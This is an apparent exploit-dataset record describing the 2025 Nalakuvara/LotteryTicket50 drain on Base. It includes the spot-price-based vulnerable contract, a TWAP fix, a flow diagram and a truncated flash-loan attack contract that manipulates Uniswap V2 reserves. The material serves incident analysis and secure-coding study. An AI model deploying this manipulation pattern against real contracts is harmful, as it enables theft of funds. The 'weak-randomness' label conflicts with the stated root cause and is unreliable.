@@ -1,0 +1,32 @@
+{
+ "id": "2025__2025-05-08_Nalakuvara_LotteryTicketDrain",
+ "source_file": "2025/2025-05-08_Nalakuvara_LotteryTicketDrain.md",
+ "title": "Nalakuvara / LotteryTicket50 — Lottery Ticket Exchange Mechanism Vulnerability Analysis",
+ "date": "2025-05-08",
+ "protocol": "Nalakuvara / LotteryTicket50",
+ "chain": "Base",
+ "loss_raw": "105,470 USDC",
+ "loss_usd": null,
+ "root_cause": "Missing exchange rate validation in LotteryTicketSwap50's transferToken/DestructionOfLotteryTickets functions, allowing an attacker to force an unfavorable exchange rate solely by manipulating the AMM spot price",
+ "attack_tx": "0x16a99aef...",
+ "vulnerable_contract": "0xb39392F4b6D92a6BD560Ed260C2c488081aAB8E9",
+ "classes": [
+  "weak-randomness"
+ ],
+ "code_before": [
+  "❌ Vulnerable transferToken: exchange based on spot price\ncontract LotteryTicketSwap50 {\n    address public uniswapV2Pair; // USDC/LotteryTicket50 pair\n\n    function transferToken(uint256 amount) external returns (bool) {\n        //",
+  "❌ Directly references current reserves of the Uniswap V2 pair (manipulable)\n        (uint112 r0, uint112 r1,) = IUniswapV2Pair(uniswapV2Pair).getReserves();\n        uint256 ticketPrice = uint256(r0) * 1e6 / uint256(r1); // USDC per ticket\n        //",
+  "❌ Manipulating r0 via flash loan causes ticketPrice to spike\n        uint256 usdcAmount = amount * ticketPrice;\n        IERC20(usdc).transfer(msg.sender, usdcAmount);\n        return true;\n    }\n\n    function DestructionOfLotteryTickets(uint256 _amountTickets) external returns (bool) {\n        // Burn tickets and distribute rewards\n        IERC20(LotteryTicket50).transferFrom(msg.sender, address(this), _amountTickets);\n        return transferToken(_amountTickets);\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct code: use TWAP\nfunction getTicketPrice() internal view returns (uint256) {\n    return ITWAPOracle(oracle).consult(LotteryTicket50, USDC); //",
+  "✅ TWAP\n}"
+ ],
+ "steps": [
+  "► Transfer USDC directly into V2 pair → reserve imbalance"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► Uniswap V3 Flash Loan (borrow large amount of USDC)\n  │\n  ├─[2]─► Manipulate V2 UniswapV2Pair(USDC/LotteryTicket50) price with borrowed USDC\n  │         └─► Transfer USDC directly into V2 pair → reserve imbalance\n  │         └─► LotteryTicket50 price spikes (in USDC terms)\n  │\n  ├─[3]─► Call LotteryTicketSwap50.DestructionOfLotteryTickets()\n  │         └─► Receive large amount of USDC at manipulated price for a small amount of LotteryTicket50\n  │\n  ├─[4]─► Repay V3 flash loan\n  │\n  └─[5]─► Net profit: 105,470 USDC",
+  "contract AttackContract {\n    function attack() public {\n        // [2] Transfer USDC directly into V2 pair to manipulate the price\n        IERC20(usdc).transfer(address(UniswapV2Pair), USDC_MANIPULATE_AMOUNT);\n\n        // [3] Burn tickets at manipulated price → receive large amount of USDC\n        uint256 ticketBalance = IERC20(LotteryTicket50).balanceOf(address(this));\n        IERC20(LotteryTicket50).approve(LotteryTicketSwap50, ticketBalance);\n        ILotteryTicketSwap50(LotteryTicketSwap50)\n            .DestructionOfLotteryTickets(ticketBalance);\n    }\n\n    function uniswapV3FlashCallback(\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external {\n        // [1] Handle flash loan callback\n        attack();\n\n        // [4] Repay V3 flash loan\n       "
+ ]
+}
